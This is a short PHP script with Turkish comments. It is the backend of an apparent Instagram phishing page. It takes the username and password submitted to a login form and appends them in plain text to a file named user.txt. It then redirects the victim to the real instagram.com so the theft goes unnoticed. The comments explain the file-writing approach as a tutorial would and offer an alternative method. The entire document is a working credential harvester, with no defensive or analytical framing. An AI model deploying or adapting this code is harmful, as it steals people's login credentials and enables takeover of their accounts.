

<?php
  $username = $_POST["username"];
  $password = $_POST["password"];
  // Dosyaya yazma işlemi için file_put_contents() fonksiyonunu kullanabilirsiniz
  $dosya_adi = 'user.txt';
  $yazdir = file_put_contents($dosya_adi, "username :".$username."\n"."Parola:".$password."\n"."______________________". PHP_EOL, FILE_APPEND | LOCK_EX);
  
  // Alternatif olarak, fopen(), fputs() ve fclose() fonksiyonlarını kullanarak dosyaya yazdırabilirsiniz
  /*
  $dosya = fopen($dosya_adi, 'a');
  fputs($dosya, $parola . PHP_EOL);
  fclose($dosya);
  */
  
  if ($yazdir !== false) {
    header("Location:https://www.instagram.com");
  } 
  
  else{
	  header("Location:index.html");
	  }
  
  
  exit;
